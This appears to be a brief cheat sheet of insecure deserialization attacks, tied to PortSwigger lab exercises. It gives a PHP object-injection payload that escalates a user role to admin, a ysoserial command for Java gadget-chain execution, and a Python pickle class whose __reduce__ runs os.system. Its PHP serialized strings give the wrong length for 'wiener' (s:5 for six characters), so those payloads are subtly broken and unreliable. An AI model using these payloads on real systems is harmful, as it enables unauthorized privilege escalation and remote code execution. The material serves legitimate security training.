# Insecure Deserialization - Attack Techniques

## PHP Object Injection

### Serialized Format
```
O:4:"User":2:{s:4:"name";s:5:"wiener";s:4:"role";s:4:"user";}
```

### Role Escalation Payload
```
O:4:"User":2:{s:4:"name";s:5:"wiener";s:4:"role";s:5:"admin";}
```

### PHP Magic Methods
- __wakeup() - Called on unserialize
- __destruct() - Called on object destruction  
- __toString() - Called on string conversion

## Java Deserialization

### Detection
Base64 starting with: `rO0ABXNy` (Java serialized header)

### ysoserial Payloads
```bash
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | base64
```

## Python Pickle
```python
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
```

## PortSwigger Solutions

### Lab: PHP object injection
1. Decode base64 cookie
2. Modify serialized role to "admin"
3. Re-encode and send
